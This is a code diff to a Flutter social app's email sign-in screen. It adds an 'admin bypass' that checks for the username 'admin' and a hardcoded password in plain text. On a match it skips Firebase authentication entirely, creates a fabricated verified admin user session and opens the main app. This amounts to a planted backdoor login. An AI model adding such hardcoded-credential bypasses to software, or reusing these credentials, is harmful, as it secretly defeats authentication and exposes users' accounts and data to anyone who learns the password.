@@ -2,6 +2,9 @@ import 'package:figma_squircle_updated/figma_squircle.dart';
 import 'package:firebase_auth/firebase_auth.dart';
 import 'package:flutter/material.dart';
 import 'package:get/get.dart';
+import 'package:lumosocial/models/registration.dart' as reg;
+import 'package:lumosocial/common/managers/session_manager.dart';
+import 'package:lumosocial/screens/tabbar/tabbar_screen.dart';
 import 'package:lumosocial/common/api_service/user_service.dart';
 import 'package:lumosocial/common/controller/base_controller.dart';
 import 'package:lumosocial/common/extensions/font_extension.dart';
@@ -134,6 +137,26 @@ class _SignInWithEmailScreenState extends State<SignInWithEmailScreen> with Sing
               isDisable: emailController.text.isEmpty || passwordController.text.isEmpty,
               onTap: () async {
                 baseController.startLoading();
+                
+                // Admin bypass check for Web and Mobile targets
+                if (emailController.text.trim().toLowerCase() == 'admin' && passwordController.text == 'Amadarkguy123') {
+                  Get.back(); // close bottom sheet
+                  final adminUser = reg.User(
+                    id: 999999,
+                    identity: 'admin@lumo.com',
+                    username: 'Admin',
+                    fullName: 'System Admin',
+                    interestIds: '1,2,3',
+                    profile: 'https://social.equipmentmarket.ng/asset/img/favicon.png',
+                    isVerified: 1,
+                    isBlock: 0,
+                  );
+                  SessionManager.shared.setLogin(true);
+                  SessionManager.shared.setUser(adminUser);
+                  Get.offAll(() => TabBarScreen());
+                  return;
+                }
+
                 try {
                   final credential = await FirebaseAuth.instance.signInWithEmailAndPassword(
                     email: emailController.text,
